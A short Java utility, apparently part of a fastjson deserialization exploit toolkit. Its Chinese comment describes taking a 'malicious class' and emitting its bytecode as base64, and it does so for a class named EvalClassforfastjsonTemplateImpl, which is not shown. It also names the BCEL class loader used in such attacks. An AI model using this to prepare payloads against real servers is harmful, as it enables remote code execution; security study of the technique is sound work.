package fasjsonxxxx;

import com.sun.org.apache.bcel.internal.Repository;

import java.net.URLClassLoader;
import java.util.Base64;

public class EvalClastoBytes {
    /*
    根据恶意类获取恶意类字节码的base64编码
     */
    public String Starts(Class Evalclass){
        return Base64.getEncoder().encodeToString(Repository.lookupClass(Evalclass).getBytes());
    }

    public static void main(String[] args) throws Exception{
//        测试代码
        EvalClastoBytes evalClastoBytes = new EvalClastoBytes();
        String xx = evalClastoBytes.Starts(EvalClassforfastjsonTemplateImpl.class);
        System.out.println(xx);
//        com.sun.org.apache.bcel.internal.util.ClassLoader
    }
}
